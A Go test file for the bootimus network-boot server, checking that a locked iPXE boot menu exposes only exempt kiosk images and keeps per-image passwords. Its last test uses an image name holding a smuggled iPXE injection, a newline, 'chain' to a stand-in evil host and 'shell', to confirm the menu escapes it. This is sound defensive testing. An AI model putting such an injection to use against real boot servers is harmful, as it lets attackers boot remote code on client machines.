package server

import (
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"

	"bootimus/internal/models"
)

func lockedImageRequest(server *Server, image *models.Image) *httptest.ResponseRecorder {
	response := httptest.NewRecorder()
	server.handleBootMenuImage(response, httptest.NewRequest(http.MethodGet, "/boot-menu-image?mac="+bootTestMAC+"&image="+strconvImage(image), nil))
	return response
}

func TestLockedImageExceptionDoesNotUnlockMenu(test *testing.T) {
	server, store, protected := newBootAuthServer(test, true)
	kiosk := &models.Image{Name: "Kiosk", Filename: "kiosk.iso", Enabled: true, Public: true, BootMethod: "kernel", BootMenuExempt: true}
	if err := store.CreateImage(kiosk); err != nil {
		test.Fatal(err)
	}
	if err := store.SetNextBootImage(bootTestMAC, protected.Filename); err != nil {
		test.Fatal(err)
	}
	for _, commit := range []bool{false, true} {
		result := server.renderBootMenu(bootTestMAC, "", commit)
		if result.Kind != "locked" || !strings.Contains(result.Script, "item public"+strconvImage(kiosk)+" Kiosk") {
			test.Fatal("kiosk missing from locked menu")
		}
		for _, forbidden := range []string{"Protected image", "item shell", "item tools", "kernel ", "set bootimus_session"} {
			if strings.Contains(result.Script, forbidden) {
				test.Fatalf("locked menu exposes %q", forbidden)
			}
		}
	}
	response := lockedImageRequest(server, kiosk)
	if response.Code != http.StatusOK || !strings.Contains(response.Body.String(), "/boot/kiosk/vmlinuz") {
		test.Fatalf("kiosk did not boot: %d %s", response.Code, response.Body.String())
	}
	if response.Header().Get("Cache-Control") != "no-store" || strings.Contains(response.Body.String(), "set bootimus_session") || strings.Contains(response.Body.String(), "item shell") {
		test.Fatal("exception cached or unlocked menu access")
	}
	client, err := store.GetClient(bootTestMAC)
	if err != nil || client.NextBootImage != protected.Filename {
		test.Fatal("kiosk consumed another pending image")
	}
	if response := lockedImageRequest(server, protected); response.Code != http.StatusForbidden {
		test.Fatal("direct request bypassed global password")
	}
	fields := url.Values{"action": {"image"}, "mac": {bootTestMAC}, "image": {strconvImage(protected)}, "password": {"image&=%"}}
	if response := bootAuthRequest(server, fields); response.Code != http.StatusForbidden {
		test.Fatal("image password bypassed global password without an exception")
	}
	if err := store.SetNextBootImage(bootTestMAC, kiosk.Filename); err != nil {
		test.Fatal(err)
	}
	if response := lockedImageRequest(server, kiosk); response.Code != http.StatusOK {
		test.Fatal(response.Code)
	}
	client, err = store.GetClient(bootTestMAC)
	if err != nil || client.NextBootImage != "" {
		test.Fatal("successful kiosk selection did not consume matching next boot")
	}
	kiosk.BootMenuExempt = false
	if err := store.UpdateImage(kiosk.Filename, kiosk); err != nil {
		test.Fatal(err)
	}
	if response := lockedImageRequest(server, kiosk); response.Code != http.StatusForbidden {
		test.Fatal("stale menu bypassed revoked exception")
	}
}

func TestLockedImageKeepsItsPassword(test *testing.T) {
	server, store, image := newBootAuthServer(test, true)
	image.BootMenuExempt = true
	if err := store.UpdateImage(image.Filename, image); err != nil {
		test.Fatal(err)
	}
	if err := store.SetNextBootImage(bootTestMAC, image.Filename); err != nil {
		test.Fatal(err)
	}
	response := lockedImageRequest(server, image)
	if response.Code != http.StatusOK || !strings.Contains(response.Body.String(), "form Image password") || strings.Contains(response.Body.String(), "kernel ") {
		test.Fatal("exception bypassed image password")
	}
	client, err := store.GetClient(bootTestMAC)
	if err != nil || client.NextBootImage != image.Filename {
		test.Fatal("prompt consumed next boot")
	}
	fields := url.Values{"action": {"image"}, "mac": {bootTestMAC}, "image": {strconvImage(image)}, "password": {"wrong"}}
	if response := bootAuthRequest(server, fields); response.Code != http.StatusForbidden {
		test.Fatal("wrong image password accepted")
	}
	fields.Set("password", "image&=%")
	image.BootMenuExempt = false
	if err := store.UpdateImage(image.Filename, image); err != nil {
		test.Fatal(err)
	}
	if response := bootAuthRequest(server, fields); response.Code != http.StatusForbidden {
		test.Fatal("an outstanding password form bypassed a revoked exception")
	}
	image.BootMenuExempt = true
	if err := store.UpdateImage(image.Filename, image); err != nil {
		test.Fatal(err)
	}
	response = bootAuthRequest(server, fields)
	if response.Code != http.StatusOK || !strings.Contains(response.Body.String(), "kernel ") || strings.Contains(response.Body.String(), "set bootimus_session") {
		test.Fatal("image authentication failed or unlocked the menu")
	}
	fields.Set("action", "menu")
	if response := bootAuthRequest(server, fields); response.Code != http.StatusForbidden {
		test.Fatal("image password unlocked global menu")
	}
	image.BootPasswordHash = ""
	if err := store.UpdateImage(image.Filename, image); err != nil {
		test.Fatal(err)
	}
	if response := lockedImageRequest(server, image); response.Code != http.StatusServiceUnavailable {
		test.Fatal("missing replica verifier allowed boot")
	}
}

func TestLockedImageVisibilityAndFailures(test *testing.T) {
	server, store, image := newBootAuthServer(test, true)
	image.BootMenuExempt, image.Public = true, false
	image.BootPasswordRequired, image.BootPasswordHash = false, ""
	if err := store.UpdateImage(image.Filename, image); err != nil {
		test.Fatal(err)
	}
	if response := lockedImageRequest(server, image); response.Code != http.StatusForbidden {
		test.Fatal("exception granted client assignment")
	}
	if strings.Contains(server.renderBootMenu(bootTestMAC, "", false).Script, "item public") {
		test.Fatal("unassigned image appeared")
	}
	profile := &models.DeploymentProfile{Name: "kiosk", ImageFilename: image.Filename, FirstBootAction: models.FirstBootActionInstall}
	if err := store.CreateDeploymentProfile(profile); err != nil {
		test.Fatal(err)
	}
	client, err := store.GetClient(bootTestMAC)
	if err != nil {
		test.Fatal(err)
	}
	client.ProfileID = &profile.ID
	if err := store.UpdateClient(bootTestMAC, client); err != nil {
		test.Fatal(err)
	}
	script := server.renderBootMenu(bootTestMAC, "", false).Script
	if !strings.Contains(script, "item public") || strings.Contains(script, "goto iso") {
		test.Fatal("profile exception missing or automatically booted")
	}
	if response := lockedImageRequest(server, image); response.Code != http.StatusOK {
		test.Fatal("profile assignment not honoured")
	}
	image.Enabled = false
	if err := store.UpdateImage(image.Filename, image); err != nil {
		test.Fatal(err)
	}
	if response := lockedImageRequest(server, image); response.Code != http.StatusForbidden {
		test.Fatal("disabled image booted")
	}
	for _, target := range []string{"/boot-menu-image", "/boot-menu-image?mac=bad&image=1", "/boot-menu-image?mac=unknown&image=-1"} {
		response := httptest.NewRecorder()
		server.handleBootMenuImage(response, httptest.NewRequest(http.MethodGet, target, nil))
		if response.Code != http.StatusBadRequest {
			test.Fatalf("invalid selection accepted: %s", target)
		}
	}
	response := httptest.NewRecorder()
	server.handleBootMenuImage(response, httptest.NewRequest(http.MethodPost, "/boot-menu-image", nil))
	if response.Code != http.StatusMethodNotAllowed {
		test.Fatal("unexpected request method accepted")
	}
	if err := store.Close(); err != nil {
		test.Fatal(err)
	}
	if response := lockedImageRequest(server, image); response.Code == http.StatusOK {
		test.Fatal("storage failure allowed boot")
	}
}

func TestLockedImageLabelsCannotInjectCommands(test *testing.T) {
	server, store, image := newBootAuthServer(test, true)
	image.BootMenuExempt = true
	image.Name = "Kiosk\nchain http://example.invalid/evil && shell ${setting}"
	if err := store.UpdateImage(image.Filename, image); err != nil {
		test.Fatal(err)
	}
	script := server.renderBootMenu(bootTestMAC, "", false).Script
	for _, forbidden := range []string{"\nchain http://example.invalid", "&& shell", "${setting}"} {
		if strings.Contains(script, forbidden) {
			test.Fatal("image label injected an iPXE command")
		}
	}
}
